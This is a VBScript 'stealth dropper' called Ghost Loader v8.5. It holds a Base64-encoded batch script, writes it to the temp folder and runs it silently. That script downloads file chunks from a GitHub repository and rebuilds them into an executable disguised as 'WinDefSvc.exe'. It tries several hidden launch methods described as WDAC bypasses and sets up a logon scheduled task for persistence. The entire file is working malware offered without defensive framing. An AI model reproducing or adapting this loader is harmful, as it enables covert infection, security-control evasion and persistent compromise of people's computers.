' Ghost Loader v8.5 - Single-File Stealth Dropper
' Embedded BAT content (Base64 encoded)
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Encoded BAT content
strB64 = "QGVjaG8gb2ZmDQpzZXRsb2NhbCBlbmFibGVkZWxheWVkZXhwYW5zaW9uDQoNCjo6IEdob3N0IExvYWRlciB2OC4zIC0gV0RBQyBCeXBhc3MgRWRpdGlvbg0KOjogVXNlcyBtdWx0aXBsZSBleGVjdXRpb24gZmFsbGJhY2tzDQoNCnNldCAicmVwbz1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc29waGllZHV2YWwvZGVyL21haW4iDQpzZXQgImRlc3Q9JUxPQ0FMQVBQREFUQSVcV2luRGVmU3ZjIg0Kc2V0ICJleGU9V2luRGVmU3ZjLmV4ZSINCg0KOjogQW50aS1hbmFseXNpcyBkZWxheQ0KcGluZyAtbiA4IDEyNy4wLjAuMSA+bnVsIDI+JjENCg0KOjogQ3JlYXRlIGRpcmVjdG9yeQ0KaWYgbm90IGV4aXN0ICIlZGVzdCUiIG1rZGlyICIlZGVzdCUiIDI+bnVsDQpjZCAvZCAiJWRlc3QlIg0KDQo6OiBEb3dubG9hZCBjaHVua3MNCmVjaG8gSW5pdGlhbGl6aW5nLi4uDQpmb3IgL2wgJSVpIGluICgwLDEsMTApIGRvICgNCiAgICBzZXQgImlkeD0lJWkiDQogICAgaWYgJSVpIExTUyAxMCBzZXQgImlkeD0wJSVpIg0KICAgIHNldCAiZm49YmxvYl8haWR4IS5kYXQiDQogICAgaWYgbm90IGV4aXN0ICIhZm4hIiAoDQogICAgICAgIHBvd2Vyc2hlbGwgLUNvbW1hbmQgIiR3Yz1OZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50OyAkd2MuRG93bmxvYWRGaWxlKCclcmVwbyUvIWZuIScsJyVkZXN0JVwhZm4hJykiIDI+bnVsDQogICAgKQ0KKQ0KDQo6OiBWZXJpZnkNCmlmIG5vdCBleGlzdCAiYmxvYl8wMC5kYXQiIGV4aXQgL2IgMQ0KDQo6OiBSZWFzc2VtYmxlDQpjb3B5IC9iIGJsb2JfMDAuZGF0K2Jsb2JfMDEuZGF0K2Jsb2JfMDIuZGF0K2Jsb2JfMDMuZGF0K2Jsb2JfMDQuZGF0K2Jsb2JfMDUuZGF0K2Jsb2JfMDYuZGF0K2Jsb2JfMDcuZGF0K2Jsb2JfMDguZGF0K2Jsb2JfMDkuZGF0K2Jsb2JfMTAuZGF0ICIlZXhlJSIgPm51bCAyPiYxDQoNCjo6IE11bHRpLW1ldGhvZCBleGVjdXRpb24gKFdEQUMgYnlwYXNzIGF0dGVtcHRzKQ0KOjogTWV0aG9kIDE6IERpcmVjdCAoc3RhbmRhcmQpDQpzdGFydCAiIiAiJWV4ZSUiIDI+bnVsDQppZiAlZXJyb3JsZXZlbCU9PTAgZ290byA6ZG9uZQ0KDQo6OiBNZXRob2QgMjogUG93ZXJTaGVsbCBTdGFydC1Qcm9jZXNzDQpwb3dlcnNoZWxsIC1Db21tYW5kICJTdGFydC1Qcm9jZXNzICclZGVzdCVcJWV4ZSUnIC1XaW5kb3dTdHlsZSBIaWRkZW4iIDI+bnVsDQppZiAlZXJyb3JsZXZlbCU9PTAgZ290byA6ZG9uZQ0KDQo6OiBNZXRob2QgMzogQ01EIC9DIHdyYXBwZXINCmNtZCAvYyBzdGFydCAiIiAiJWV4ZSUiIDI+bnVsDQppZiAlZXJyb3JsZXZlbCU9PTAgZ290byA6ZG9uZQ0KDQo6OiBNZXRob2QgNDogRXhwbG9yZXIgc2hlbGwNCmV4cGxvcmVyICIlZXhlJSIgMj5udWwNCg0KOmRvbmUNCjo6IFBlcnNpc3RlbmNlDQpwb3dlcnNoZWxsIC1Db21tYW5kICIkYT1OZXctU2NoZWR1bGVkVGFza0FjdGlvbiAtRXhlY3V0ZSAnJWRlc3QlXCVleGUlJzskdD1OZXctU2NoZWR1bGVkVGFza1RyaWdnZXIgLUF0TG9nT247UmVnaXN0ZXItU2NoZWR1bGVkVGFzayAtVGFza05hbWUgJ1dpbkRlZlN2YycgLUFjdGlvbiAkYSAtVHJpZ2dlciAkdCAtRm9yY2UiID5udWwgMj4mMQ0KDQp0aW1lb3V0IC90IDIgPm51bA0KZXhpdA0K"

' Decode Base64 using PowerShell
strTempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
strBatPath = strTempDir & "\sysupd.bat"

' Write decoded BAT to temp
strPS = "powershell -Command ""[IO.File]::WriteAllBytes('" & strBatPath & "',[Convert]::FromBase64String('" & strB64 & "'))"""
objShell.Run strPS, 0, True

' Execute BAT silently
objShell.Run "cmd /c """ & strBatPath & """", 0, False

' Cleanup VBS reference
WScript.Quit
